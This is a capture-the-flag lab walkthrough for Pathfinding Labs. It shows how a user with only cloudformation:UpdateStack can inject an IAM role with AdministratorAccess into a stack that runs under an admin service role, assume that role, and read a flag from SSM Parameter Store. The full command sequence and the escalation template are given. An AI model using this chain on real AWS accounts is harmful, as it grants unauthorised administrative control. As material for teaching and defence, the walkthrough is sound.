# Guided Walkthrough: Privilege Escalation via cloudformation:UpdateStack

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with `cloudformation:UpdateStack` permission can modify an existing CloudFormation stack that has an administrative service role attached. CloudFormation stacks execute with the permissions of their service role, which often requires elevated privileges to manage infrastructure. By updating the stack template to include new IAM resources, an attacker can leverage the stack's elevated permissions to create resources they couldn't create directly.

In production environments, CloudFormation stacks frequently have administrative or near-administrative service roles to allow them to provision and manage diverse AWS resources. DevOps teams may grant developers `cloudformation:UpdateStack` permissions for legitimate infrastructure updates, but this creates an indirect privilege escalation path. The attacker doesn't need direct IAM permissions to create roles or policies — they only need the ability to modify a stack that already has those permissions.

This attack is particularly insidious because it appears as legitimate infrastructure management activity. The CloudFormation stack update follows normal change management processes, making it difficult to distinguish from authorized infrastructure modifications. Organizations often overlook this privilege escalation vector because the `UpdateStack` permission seems less dangerous than direct IAM permissions, yet it provides equivalent access through the stack's service role.

## The Challenge

You start as `pl-prod-cloudformation-002-to-admin-starting-user`, an IAM user with a narrow set of permissions. Notably, this user has `cloudformation:UpdateStack` on the stack `pl-prod-cloudformation-002-to-admin-stack` — but no direct IAM write permissions.

Your goal is to achieve full administrative access to the AWS account, specifically by assuming `pl-prod-cloudformation-002-to-admin-escalated-role`.

The key insight is that the CloudFormation stack (`pl-prod-cloudformation-002-to-admin-stack`) has an administrative service role (`pl-prod-cloudformation-002-to-admin-stack-role`) attached to it. Any resource created by a stack update is created using the service role's permissions — not your own. This means you can create IAM roles with `AdministratorAccess` even though you have no direct IAM permissions.

## Reconnaissance

First, confirm your identity and verify you lack admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-cloudformation-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- as expected
```

Now inspect the CloudFormation stack to understand what you're working with. Use the `cloudformation:DescribeStacks` and `cloudformation:GetTemplate` helpful permissions to gather intelligence:

```bash
aws cloudformation describe-stacks \
  --stack-name pl-prod-cloudformation-002-to-admin-stack \
  --query 'Stacks[0].[StackName,StackStatus,RoleARN]' \
  --output table
```

The output reveals the stack's `RoleARN` — this is the service role that CloudFormation uses when executing updates. Check what permissions that role has:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-cloudformation-002-to-admin-stack-role
# AdministratorAccess is attached
```

Retrieve the current stack template to understand what resources already exist:

```bash
aws cloudformation get-template \
  --stack-name pl-prod-cloudformation-002-to-admin-stack \
  --query 'TemplateBody' \
  --output text
```

The current template only contains a benign S3 bucket. This is your attack surface: you can add an IAM role to this template, and the stack's `AdministratorAccess` service role will create it for you.

## Exploitation

Build a modified template that keeps the existing S3 bucket and adds a new IAM role with `AdministratorAccess`. The trust policy on the new role must allow your starting user to assume it:

```json
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "InitialBucket": {
      "Type": "AWS::S3::Bucket",
      "Properties": { ... }
    },
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "pl-prod-cloudformation-002-to-admin-escalated-role",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-002-to-admin-starting-user"
            },
            "Action": "sts:AssumeRole"
          }]
        },
        "ManagedPolicyArns": [
          "arn:aws:iam::aws:policy/AdministratorAccess"
        ]
      }
    }
  }
}
```

Save this template to `/tmp/malicious-stack-template.json`, then submit the stack update:

```bash
aws cloudformation update-stack \
  --stack-name pl-prod-cloudformation-002-to-admin-stack \
  --template-body file:///tmp/malicious-stack-template.json \
  --capabilities CAPABILITY_NAMED_IAM
```

The `--capabilities CAPABILITY_NAMED_IAM` flag is required because the template creates a named IAM role. Without it, CloudFormation will reject the update. Wait for the update to complete:

```bash
aws cloudformation wait stack-update-complete \
  --stack-name pl-prod-cloudformation-002-to-admin-stack
```

Give IAM a moment to propagate the new role (~15 seconds), then assume it:

```bash
ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-cloudformation-002-to-admin-escalated-role"

CREDENTIALS=$(aws sts assume-role \
  --role-arn "$ROLE_ARN" \
  --role-session-name escalation-session \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.SessionToken')
```

## Verification

Verify you now hold administrator credentials:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-cloudformation-002-to-admin-escalated-role/escalation-session

aws iam list-users --max-items 3 --output table
# Successfully lists IAM users -- admin access confirmed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy attached to the escalated role provides implicitly.

Using the credentials from the assumed escalated role session, read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/cloudformation-002-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the gap between what your IAM user is allowed to do directly and what it can do indirectly by modifying a CloudFormation stack. Your user had no IAM write permissions whatsoever, yet by adding a single resource to a stack template, you caused the stack's `AdministratorAccess` service role to create a new IAM role on your behalf.

This is a classic confused-deputy style attack: CloudFormation acts as a privileged intermediary, trusting the stack template without regard for whether the entity submitting the update is authorized to perform the IAM operations that the template implies. The organization granted `cloudformation:UpdateStack` thinking it was a lower-risk infrastructure permission, without recognizing that it was functionally equivalent to `iam:CreateRole` + `iam:AttachRolePolicy` when a privileged service role is in the picture.
